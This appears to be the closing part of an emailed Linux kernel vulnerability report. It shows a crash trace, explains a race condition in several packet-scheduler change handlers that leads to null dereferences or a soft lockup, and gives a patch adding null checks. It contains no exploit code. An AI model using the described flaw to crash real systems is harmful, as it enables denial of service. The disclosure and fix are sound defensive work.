[   56.914254]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   56.914269] RIP: 0033:0x7f4bd2cf3004
[   56.914281] Code: 15 19 6e 0d 00 f7 d8 64 89 02 b8 ff ff ff ff eb bf 0f =
1f 44 00 00 f3 0f 1e fa 80 3d 45 f0 0d 00 00 74 13 b8 2e 00 00 00 0f 05 <48=
> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 85
[   56.914294] RSP: 002b:00007ffc7f3d76e8 EFLAGS: 00000202 ORIG_RAX: 000000=
000000002e
[   56.914306] RAX: ffffffffffffffda RBX: 0000565133416480 RCX: 00007f4bd2c=
f3004
[   56.914315] RDX: 0000000000000000 RSI: 00007ffc7f3d7750 RDI: 00000000000=
00003
[   56.914321] RBP: 00000000680b8435 R08: 0000000000000010 R09: 00000000000=
00000
[   56.914328] R10: 000056515ea058f0 R11: 0000000000000202 R12: 00007ffc7f3=
d7750
[   56.914334] R13: 0000565133416480 R14: 00005651333ef1fa R15: 00005651333=
ef21e
[   56.914352]  </TASK>

This soft lockup occurs because of the empty queue check in hhf_dequeue (ht=
tps://elixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_hhf.c#L428). =
It returns immediately without updating qlen, so the while loop remains stu=
ck.

For reference, the buggy parts of the code are the following:
https://elixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_codel.c#L14=
9
https://elixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_pie.c#L200
https://elixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_fq_pie.c#L3=
71
https://elixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_fq_codel.c#=
L446
https://elixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_hhf.c#L567

The fq qdisc shares the same code pattern, but checks for a null skb before=
 moving on and does not crash: https://elixir.bootlin.com/linux/v6.15-rc3/s=
ource/net/sched/sch_fq.c#L1141.

Feel free to let us know your thoughts, and if there is anything else we ca=
n do to help with this. A proposed patch that we have confirmed to stop the=
 crashes is below.

Best,
Will (will@willsroot.io, willsroot@protonmail.com)
Savy (savy@syst3mfailure.io)

From f11ac9aa00956d4c3088bc8ec3251157a7a4ab76 Mon Sep 17 00:00:00 2001
From: William Liu <will@willsroot.io>
Date: Fri, 25 Apr 2025 06:51:22 -0700
Subject: [PATCH] net/sched: Exit dequeue loop if empty queue in change
 handlers for codel, pie, fq_codel, fq_pie, and hhf Qdisc_ops

When qdiscs dequeue packets to reach a newly set limit in the
change handler, qdisc dequeue can be called from elsewhere
and cause the queue to become empty. This TOCTOU bug can
cause a null dereference in codel_change, pie_change,
fq_codel_change, fq_pie_change, or a soft lockup in hhf_change.

Add a check like in fq_change against a null skb.

Signed-off-by: William Liu <will@willsroot.io>
Signed-off-by: Savino Dicanosa <savy@syst3mfailure.io>
---
 net/sched/sch_codel.c    | 3 +++
 net/sched/sch_fq_codel.c | 3 +++
 net/sched/sch_fq_pie.c   | 3 +++
 net/sched/sch_hhf.c      | 3 +++
 net/sched/sch_pie.c      | 3 +++
 5 files changed, 15 insertions(+)

diff --git a/net/sched/sch_codel.c b/net/sched/sch_codel.c
index 12dd71139da3..e714f324a85b 100644
--- a/net/sched/sch_codel.c
+++ b/net/sched/sch_codel.c
@@ -146,6 +146,9 @@ static int codel_change(struct Qdisc *sch, struct nlatt=
r *opt,
    while (sch->q.qlen > sch->limit) {
        struct sk_buff *skb =3D __qdisc_dequeue_head(&sch->q);
=20
+       if (!skb)
+           break;
+
        dropped +=3D qdisc_pkt_len(skb);
        qdisc_qstats_backlog_dec(sch, skb);
        rtnl_qdisc_drop(skb, sch);
diff --git a/net/sched/sch_fq_codel.c b/net/sched/sch_fq_codel.c
index 6c9029f71e88..85d591b430e4 100644
--- a/net/sched/sch_fq_codel.c
+++ b/net/sched/sch_fq_codel.c
@@ -443,6 +443,9 @@ static int fq_codel_change(struct Qdisc *sch, struct nl=
attr *opt,
           q->memory_usage > q->memory_limit) {
        struct sk_buff *skb =3D fq_codel_dequeue(sch);
=20
+       if (!skb)
+           break;
+
        q->cstats.drop_len +=3D qdisc_pkt_len(skb);
        rtnl_kfree_skbs(skb, skb);
        q->cstats.drop_count++;
diff --git a/net/sched/sch_fq_pie.c b/net/sched/sch_fq_pie.c
index f3b8203d3e85..f52e355698ca 100644
--- a/net/sched/sch_fq_pie.c
+++ b/net/sched/sch_fq_pie.c
@@ -368,6 +368,9 @@ static int fq_pie_change(struct Qdisc *sch, struct nlat=
tr *opt,
    while (sch->q.qlen > sch->limit) {
        struct sk_buff *skb =3D fq_pie_qdisc_dequeue(sch);
=20
+       if (!skb)
+           break;
+
        len_dropped +=3D qdisc_pkt_len(skb);
        num_dropped +=3D 1;
        rtnl_kfree_skbs(skb, skb);
diff --git a/net/sched/sch_hhf.c b/net/sched/sch_hhf.c
index 44d9efe1a96a..c9da90689e0c 100644
--- a/net/sched/sch_hhf.c
+++ b/net/sched/sch_hhf.c
@@ -566,6 +566,9 @@ static int hhf_change(struct Qdisc *sch, struct nlattr =
*opt,
    while (sch->q.qlen > sch->limit) {
        struct sk_buff *skb =3D hhf_dequeue(sch);
=20
+       if (!skb)
+           break;
+
        rtnl_kfree_skbs(skb, skb);
    }
    qdisc_tree_reduce_backlog(sch, qlen - sch->q.qlen,
diff --git a/net/sched/sch_pie.c b/net/sched/sch_pie.c
index 3771d000b30d..6810126b8368 100644
--- a/net/sched/sch_pie.c
+++ b/net/sched/sch_pie.c
@@ -197,6 +197,9 @@ static int pie_change(struct Qdisc *sch, struct nlattr =
*opt,
    while (sch->q.qlen > sch->limit) {
        struct sk_buff *skb =3D __qdisc_dequeue_head(&sch->q);
=20
+       if (!skb)
+           break;
+
        dropped +=3D qdisc_pkt_len(skb);
        qdisc_qstats_backlog_dec(sch, skb);
        rtnl_qdisc_drop(skb, sch);
--=20
2.43.0


